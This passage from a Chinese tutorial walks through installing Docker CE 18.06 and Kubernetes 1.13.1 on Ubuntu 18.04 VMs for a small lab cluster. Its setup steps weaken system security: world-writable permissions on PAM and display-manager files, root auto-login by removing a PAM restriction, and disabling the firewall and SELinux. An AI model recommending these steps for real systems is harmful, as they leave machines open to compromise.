部署软件环境版本"></a>2.1 部署软件环境版本</h3><p>操作系统: <code>Ubuntu 18.04</code>（自行下载安装即可，我们采用在VMware中安装，语言最好选择英文，在对虚拟机命名时最好直接命名为master、node1,…）</p><p>Docker： <code>docker-ce 18.06</code></p><p>Kubernetes: <code>k8s 1.13.1</code></p><h3 id="2-2-修改root密码并设置开机root自动登录"><a href="#2-2-修改root密码并设置开机root自动登录" class="headerlink" title="2.2 修改root密码并设置开机root自动登录"></a>2.2 修改root密码并设置开机root自动登录</h3><h4 id="2-2-1-为root设置密码"><a href="#2-2-1-为root设置密码" class="headerlink" title="2.2.1 为root设置密码"></a>2.2.1 为root设置密码</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo passwd root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-2-2-修改50-ubuntu-conf配置文件内容"><a href="#2-2-2-修改50-ubuntu-conf配置文件内容" class="headerlink" title="2.2.2 修改50-ubuntu.conf配置文件内容"></a>2.2.2 修改50-ubuntu.conf配置文件内容</h4><p>​        文件位置/usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf（如果没有此文件，就到这个目录找类似文件）</p><ol><li>找到文件后使用终端修改文件权限（默认为只读）</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo  chmod  777  &#x2F;usr&#x2F;share&#x2F;lightdm&#x2F;lightdm.conf.d&#x2F;50-ubuntu.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>打开文件，修改配置文件内容(个人推荐使用gedit命令)</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gedit  &#x2F;usr&#x2F;share&#x2F;lightdm&#x2F;lightdm.conf.d&#x2F;50-ubuntu.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在文件末尾加入两行代码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">greeter-show-manual-login&#x3D;trueall-guest&#x3D;false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>此配置文件就设置完成了。</p><h4 id="2-2-3-修改gdm-autologin和gdm-passwd文件"><a href="#2-2-3-修改gdm-autologin和gdm-passwd文件" class="headerlink" title="2.2.3 修改gdm-autologin和gdm-passwd文件"></a>2.2.3 修改gdm-autologin和gdm-passwd文件</h4><p>​        进入/etc/pam.d文件夹下，找到gdm-autologin和gdm-passwd文件（没有的话找类似文件）</p><p>​        找到文件后参照之前的操作给予文件权限</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo  chmod  777 &#x2F;etc&#x2F;pam.d&#x2F;gdm-autologinsudo  chmod  777 &#x2F;etc&#x2F;pam.d&#x2F;gdm-password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​        两个文件都注释掉auth required pam_success_if.so user!=root quiet_success这一行(我的是正着数第三行)</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gedit &#x2F;etc&#x2F;pam.d&#x2F;gdm-autologingedit &#x2F;etc&#x2F;pam.d&#x2F;gdm-password <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修改完这两个文件就可以进行下一步了。</p><h4 id="2-2-3-修改-root-profile文件"><a href="#2-2-3-修改-root-profile文件" class="headerlink" title="2.2.3 修改/root/.profile文件"></a>2.2.3 修改/root/.profile文件</h4><p>​        找到要修改的.profile文件，此文件为隐藏文件，建议直接命令行查找</p><p>​        开启root权限，打开文件，注释掉最后一行，然后加上<br>​        tty -s&amp;&amp;mesg n || true</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gedit &#x2F;root&#x2F;.profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/10208472/1.png" alt=" "></p><p>至此root用户登录权限设置完成，重新启动后选择其他用户(这个在左下角)输入用户名：root，以及root密码即可登录。（仍需手动输入用户名和密码）</p><h4 id="2-2-4-修改custom-conf文件"><a href="#2-2-4-修改custom-conf文件" class="headerlink" title="2.2.4 修改custom.conf文件"></a>2.2.4 修改custom.conf文件</h4><p>文件夹路径为/etc/gdm3/（没有的话找类似文件夹，例如：/gdm）</p><p>ps：没有这个文件的话把设置里的用户登录的自动登录选项打开。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gedit custom.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改文件</p><p><img src="/2022/10208472/2.png" alt=" "></p><h3 id="三、Docker-CE安装及配置（我们全程在root下）"><a href="#三、Docker-CE安装及配置（我们全程在root下）" class="headerlink" title="三、Docker-CE安装及配置（我们全程在root下）"></a>三、Docker-CE安装及配置（我们全程在root下）</h3><h4 id="3-1-给虚拟机切换阿里源-清华源都行"><a href="#3-1-给虚拟机切换阿里源-清华源都行" class="headerlink" title="3.1 给虚拟机切换阿里源(清华源都行)"></a>3.1 给虚拟机切换阿里源(清华源都行)</h4><h5 id="3-1-1-备份原来的系统默认源"><a href="#3-1-1-备份原来的系统默认源" class="headerlink" title="3.1.1 备份原来的系统默认源"></a>3.1.1 备份原来的系统默认源</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo cp &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources_init.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3-1-2-更换源"><a href="#3-1-2-更换源" class="headerlink" title="3.1.2 更换源"></a>3.1.2 更换源</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo gedit &#x2F;etc&#x2F;apt&#x2F;sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用gedit文本编辑器，将下边的阿里源复制进去(粘贴之前里面东西可清空)，然后点击保存关闭。</p><pre class="line-numbers language-none"><code class="language-none">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-security main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-updates main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-proposed main restricted universe multiversedeb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiversedeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu&#x2F; bionic-backports main restricted universe multiverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-1-3-更新源"><a href="#3-1-3-更新源" class="headerlink" title="3.1.3 更新源"></a>3.1.3 更新源</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-2-1-基础准备"><a href="#3-2-1-基础准备" class="headerlink" title="3.2.1 基础准备"></a>3.2.1 基础准备</h4><ol><li>Docker 要求 Ubuntu 系统的内核版本高于 3.10 ，查看本页面的前提条件来验证你的 Ubuntu 版本是否支持 Docker。</li></ol>  <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">uname -r (主版本必须保持一致)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>   2.安装<code>curl </code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">apt-get update &amp;&amp; apt-get install -y curl telnet wget man \apt-transport-https \ca-certificates \software-properties-common vim<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-2-在线安装Docker-ce-本教程不推荐"><a href="#3-2-2-在线安装Docker-ce-本教程不推荐" class="headerlink" title="3.2.2 在线安装Docker-ce(本教程不推荐)"></a>3.2.2 在线安装Docker-ce(本教程不推荐)</h4><p>(建议下面的手动安装方式，因为在线可能会出现版本不一致)</p><p>注意： <strong>该国内源目前提供 <code>18.09</code>版本，与k8s不符。k8s推荐安装<code>Docker ce 18.06</code></strong></p><ol><li>安装GPG秘钥和添加国内镜像</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ curl -fsSL https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu&#x2F;gpg | sudo apt-key add -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加国内源头</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ add-apt-repository \    &quot;deb https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu \    $(lsb_release -cs) \    stable&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>更新国内源路径</li></ol><pre class="line-numbers language-none"><code class="language-none">apt update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>安装查看版本指令</li></ol><pre class="line-numbers language-none"><code class="language-none">apt-get install -y apt-show-versions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>查看docker-ce版本号</li></ol><pre class="line-numbers language-none"><code class="language-none">apt-show-versions -a docker-ce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>在线安装<code>Docker-ce</code></li></ol><pre class="line-numbers language-none"><code class="language-none">sudo apt-get update &amp;&amp; apt-get install -y docker-ce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意查看当前安装的真实版本</p><h5 id="3-2-3-手动安装Docker-离线安装"><a href="#3-2-3-手动安装Docker-离线安装" class="headerlink" title="3.2.3 手动安装Docker(离线安装)"></a>3.2.3 手动安装Docker(离线安装)</h5><ol><li>下载<code>docker-ce_18.06.1\~ce\~3-0\~ubuntu_amd64.deb</code></li><li>上传到上述文件到待安装服务器<code>master</code></li><li>登录待安装服务器，切换到root账户</li><li><code>dpkg -i docker-ce_18.06.1\~ce\~3-0\~ubuntu_amd64.deb</code></li></ol><blockquote><p>如果提示错误</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dpkg: error: dpkg frontend is locked by another process<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明已经有其他进程在使用dpkg安装程序</p><pre class="line-numbers language-none"><code class="language-none">sudo rm &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;lock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>即可。</p><p>如果提示错误</p><pre class="line-numbers language-none"><code class="language-none">itcast@master:~&#x2F;package$ sudo dpkg -i docker-ce_18.06.1~ce~3-0~ubuntu_amd64.deb [sudo] password for itcast: Selecting previously unselected package docker-ce.(Reading database ... 100647 files and directories currently installed.)Preparing to unpack docker-ce_18.06.1~ce~3-0~ubuntu_amd64.deb ...Unpacking docker-ce (18.06.1~ce~3-0~ubuntu) ...dpkg: dependency problems prevent configuration of docker-ce: docker-ce depends on libltdl7 (&gt;&#x3D; 2.4.6); however:  Package libltdl7 is not installed.dpkg: error processing package docker-ce (--install): dependency problems - leaving unconfiguredProcessing triggers for man-db (2.8.4-2) ...Processing triggers for systemd (239-7ubuntu10) ...Errors were encountered while processing: docker-ce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>表示当前docker-ce 依赖系统libltd17库，安装就可以了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ apt-get install -y libltdl7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>docker version </li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Client: Version:           18.06.1-ce API version:       1.38 Go version:        go1.10.3 Git commit:        e68fc7a Built:             Tue Aug 21 17:24:56 2018 OS&#x2F;Arch:           linux&#x2F;amd64 Experimental:      falseServer: Engine:  Version:          18.06.1-ce  API version:      1.38 (minimum version 1.12)  Go version:       go1.10.3  Git commit:       e68fc7a  Built:            Tue Aug 21 17:23:21 2018  OS&#x2F;Arch:          linux&#x2F;amd64  Experimental:     false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>确保版本号是 <code>18.06</code></p><h5 id="3-3-启动Docker-ce"><a href="#3-3-启动Docker-ce" class="headerlink" title="3.3 启动Docker-ce"></a>3.3 启动Docker-ce</h5><ol><li>开机并启动docker</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo systemctl enable docker sudo systemctl start docker <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>重启，登录确认<code>docker</code>已经运行</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">itcast@ubuntu:~$ sudo docker ps CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="3-4-docker配置国内镜像加速器"><a href="#3-4-docker配置国内镜像加速器" class="headerlink" title="3.4 docker配置国内镜像加速器"></a>3.4 docker配置国内镜像加速器</h5><blockquote><p>目的 : 为了下载docker镜像更快</p></blockquote><p>您可以通过修改<code>daemon</code>配置文件<code>/etc/docker/daemon.json</code>来使用加速器。</p><p>创建<code>/etc/docker/daemon.json</code>文件，内容如下：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">&#123;  &quot;registry-mirrors&quot;: [&quot;https:&#x2F;&#x2F;ozcouv1b.mirror.aliyuncs.com&quot;]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>重启docker服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># 重载所有修改过的配置文件sudo systemctl daemon-reload# 重启Docker服务sudo systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="四、Kubernetes-安装及部署"><a href="#四、Kubernetes-安装及部署" class="headerlink" title="四、Kubernetes 安装及部署"></a>四、Kubernetes 安装及部署</h3><h4 id="4-1-k8s安装环境准备"><a href="#4-1-k8s安装环境准备" class="headerlink" title="4.1 k8s安装环境准备"></a>4.1 k8s安装环境准备</h4><h5 id="4-1-1-配置并安装k8s国内源"><a href="#4-1-1-配置并安装k8s国内源" class="headerlink" title="4.1.1 配置并安装k8s国内源"></a>4.1.1 配置并安装k8s国内源</h5><ol><li><p>创建配置文件<code>sudo touch /etc/apt/sources.list.d/kubernetes.list</code> </p></li><li><p>添加写权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">itcast@master:~$ sudo chmod 666 &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;kubernetes.list <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再添加，内容如下:</p><pre class="line-numbers language-none"><code class="language-none">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>执行<code>sudo apt update</code> 更新操作系统源，开始会遇见如下错误</p></li></ol><pre class="line-numbers language-none"><code class="language-none">tcast@master:~$ sudo apt updateGet:1 http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial InRelease [8,993 B]Err:1 http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial InRelease      The following signatures couldn&#39;t be verified because the public key is not available: NO_PUBKEY 6A030B21BA07F4FBHit:2 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic InRelease                        Hit:3 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic-updates InRelease                Hit:4 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic-backports InRelease              Hit:5 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic-security InRelease               Err:6 https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu cosmic InRelease        Could not wait for server fd - select (11: Resource temporarily unavailable) [IP: 202.141.176.110 443]Reading package lists... Done                          W: GPG error: http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial InRelease: The following signatures couldn&#39;t be verified because the public key is not available: NO_PUBKEY 6A030B21BA07F4FBE: The repository &#39;http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial InRelease&#39; is not signed.N: Updating from such a repository can&#39;t be done securely, and is therefore disabled by default.N: See apt-secure(8) manpage for repository creation and user configuration details.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中：</p><pre class="line-numbers language-none"><code class="language-none">The following signatures couldn&#39;t be verified because the public key is not available: NO_PUBKEY 6A030B21BA07F4FB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>签名认证失败，需要重新生成。记住上面的<em>NO_PUBKEY</em> <code>6A030B21BA07F4FB</code></p><ol start="4"><li>添加认证key</li></ol><pre class="line-numbers language-none"><code class="language-none">gpg --keyserver keyserver.ubuntu.com --recv-keys BA07F4FB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着运行如下命令，确认看到<strong>OK</strong>，说明成功，之后进行安装:</p><pre class="line-numbers language-none"><code class="language-none">gpg --export --armor BA07F4FB | sudo apt-key add -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>再次重新<code>sudo apt update</code>更新系统下载源数据列表</li></ol><pre class="line-numbers language-none"><code class="language-none">itcast@master:~$ sudo apt updateHit:1 https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;docker-ce&#x2F;linux&#x2F;ubuntu cosmic InRelease                  Hit:2 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic InRelease                                    Hit:3 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic-updates InRelease                            Hit:4 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic-backports InRelease                          Hit:5 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu cosmic-security InRelease                           Get:6 http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial InRelease [8,993 B]      Ign:7 http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial&#x2F;main amd64 PackagesGet:7 http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kubernetes&#x2F;apt kubernetes-xenial&#x2F;main amd64 Packages [26.6 kB]Fetched 26.6 kB in 42s (635 B&#x2F;s)    Reading package lists... DoneBuilding dependency tree       Reading state information... Done165 packages can be upgraded. Run &#39;apt list --upgradable&#39; to see them.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上没有报和错误异常，表示成功。</p><h5 id="4-1-2-禁止基础设施"><a href="#4-1-2-禁止基础设施" class="headerlink" title="4.1.2 禁止基础设施"></a>4.1.2 禁止基础设施</h5><ol><li><p>禁止防火墙</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ sudo ufw disableFirewall stopped and disabled on system startup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>关闭swap</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># 成功$ sudo swapoff -a # 永久关闭swap分区$ sudo sed -i &#39;s&#x2F;.*swap.*&#x2F;#&amp;&#x2F;&#39; &#x2F;etc&#x2F;fstab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>禁止selinux</p></li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># 安装操控selinux的命令$ sudo apt install -y selinux-utils# 禁止selinux$ setenforce 0# 重启操作系统$ shutdown -r now# 查看selinux是否已经关闭$ sudo getenforceDisabled(表示已经关闭)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2-k8s系统网络配置"><a href="#4-2-k8s系统网络配置" class="headerlink" title="4.2 k8s系统网络配置"></a>4.2 k8s系统网络配置</h4><p>(1) 配置内核参数，将桥接的IPv4流量传递到iptables的链</p><p>创建<code>/etc/sysctl.d/k8s.conf</code>文件</p><p>添加内容如下:</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">net.bridge.bridge-nf-call-ip6tables &#x3D; 1net.bridge.bridge-nf-call-iptables &#x3D; 1vm.swappiness &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>(2) 执行命令使修改生效</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 【候选】建议执行下面的命令$ sudo modprobe br_netfilter$ sudo sysctl -p &#x2F;etc&#x2F;sysctl.d&#x2F;k8s.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="4-3-安装k8s"><a href="#4-3-安装k8s" class="headerlink" title="4.3 安装k8s"></a>4.3 安装k8s</h4><ol><li><p>安装Kubernetes 目前安装版本  <code>v1.13.1</code></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ apt update &amp;&amp; apt-get install -y kubelet&#x3D;1.13.1-00 kubernetes-cni&#x3D;0.6.0-00 kubeadm&#x3D;1.13.1-00 kubectl&#x3D;1.13.1-00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>设置为开机重启</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ sudo systemctl enable kubelet &amp;&amp; systemctl start kubelet$ sudo shutdown -r now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h4 id="4-4-验证k8s"><a href="#4-4-验证k8s" class="headerlink" title="4.4 验证k8s"></a>4.4 验证k8s</h4><ol><li><p>使用root用户登录<code>Master</code>主机</p></li><li><p>执行如下个命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">kubectl get nodes <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p>输出如下</p>   <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ kubectl get nodesThe connection to the server localhost:8080 was refused - did you specify the right host or port?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li><p>查看当前k8s版本 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ kubectl version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Client Version: version.Info&#123;Major:&quot;1&quot;, Minor:&quot;13&quot;, GitVersion:&quot;v1.13.1&quot;, GitCommit:&quot;eec55b9ba98609a46fee712359c7b5b365bdd920&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2018-12-13T10:39:04Z&quot;, GoVersion:&quot;go1.11.2&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux&#x2F;amd64&quot;&#125;The connection to the server localhost:8080 was refused - did you specify the right host or port?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="五、创建企业Kubernetes多主机集群环境"><a href="#五、创建企业Kubernetes多主机集群环境" class="headerlink" title="五、创建企业Kubernetes多主机集群环境"></a>五、创建企业Kubernetes多主机集群环境</h3><h4 id="5-1-创建两个节点-两个虚拟机"><a href="#5-1-创建两个节点-两个虚拟机" class="headerlink" title="5.1 创建两个节点(两个虚拟机)"></a>5.1 创建两个节点(两个虚拟机)</h4><ol><li>在VMWare中创建完整克隆</li></ol><h4 id="5-2-master和node基础配置"><a href="#5-2-master和node基础配置" class="headerlink" title="5.2 master和node基础配置"></a>5.2 master和node基础配置</h4><h5 id="5-2-1-给node配置hostname"><a href="#5-2-1-给node配置hostname" class="headerlink" title="5.2.1 给node配置hostname"></a>5.2.1 给node配置hostname</h5><p><code>node1</code>主机</p><p>/etc/hostname</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">node1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>node2</code>主机</p><p>/et/hostname</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">node2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.确认配置的三台机器的主机名称</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ cat &#x2F;etc&#x2F;hosts$ shutdown -r now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="5-2-2-配置IP地址"><a href="#5-2-2-配置IP地址" class="headerlink" title="5.2.2 配置IP地址"></a>5.2.2 配置IP地址</h5><ul><li>master</li></ul><p><code>/etc/netplan/01-network-manager-all.yaml </code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">network:    ethernets:        ens33:            addresses: [192.168.111.134&#x2F;24]            dhcp4: false            gateway4: 192.168.111.2            nameservers:                       addresses: [192.168.111.2]            optional: true    version: 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重启ip配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netplan apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>node1</li></ul><p><code>/etc/netplan/01-network-manager-all.yaml </code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">network:    ethernets:        ens33:            addresses: [192.168.111.135&#x2F;24]            dhcp4: false            gateway4: 192.168.111.2            nameservers:                       addresses: [192.168.111.2]            optional: true    version: 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重启ip配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netplan apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>node2</li></ul><p><code>/etc/netplan/01-network-manager-all.yaml </code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">network:    ethernets:        ens33:            addresses: [192.168.111.136&#x2F;24]            dhcp4: false            gateway4: 192.168.111.2            nameservers:                       addresses: [192.168.111.2]            optional: true    version: 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重启ip配置</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netplan apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="5-2-3-修改hosts文件"><a href="#5-2-3-修改hosts文件" class="headerlink" title="5.2.3 修改hosts文件"></a>5.2.3 修改hosts文件</h5><p>注意： (Master、Node1、Node2都需要配置)</p><p>使用root用户登录</p><ol><li><p>打开hosts文件 <code>vim /etc/hosts</code></p></li><li><p>输入如下内容</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">192.168.111.134 master192.168.111.135 node1192.168.111.136 node2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>重启机器<code>shutdown -r now</code></p></li></ol><h4 id="5-3-配置Master节点"><a href="#5-3-配置Master节点" class="headerlink" title="5.3 配置Master节点"></a>5.3 配置Master节点</h4><h5 id="5-3-1-创建工作目录"><a href="#5-3-1-创建工作目录" class="headerlink" title="5.3.1 创建工作目录"></a>5.3.1 创建工作目录</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ mkdir &#x2F;home&#x2F;itcast&#x2F;working$ cd &#x2F;home&#x2F;itcast&#x2F;working&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="5-3-2-创建kubeadm-conf配置文件"><a href="#5-3-2-创建kubeadm-conf配置文件" class="headerlink" title="5.3.2 创建kubeadm.conf配置文件"></a>5.3.2 创建kubeadm.conf配置文件</h5><ol><li>创建k8s的管理工具<code>kubeadm</code>对应的配置文件，候选操作在<code>home/itcast/working/</code>目录下</li></ol><p>使用kubeadm配置文件，通过在配置文件中指定docker仓库地址，便于内网快速部署。</p><p>生成配置文件</p><pre class="line-numbers language-none"><code class="language-none">kubeadm config print init-defaults ClusterConfiguration &gt; kubeadm.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>修改<code>kubeadm.conf </code>中的如下两项:</li></ol><ul><li>imageRepository  </li><li>kubernetesVersion</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vi kubeadm.conf# 修改 imageRepository: k8s.gcr.io# 改为 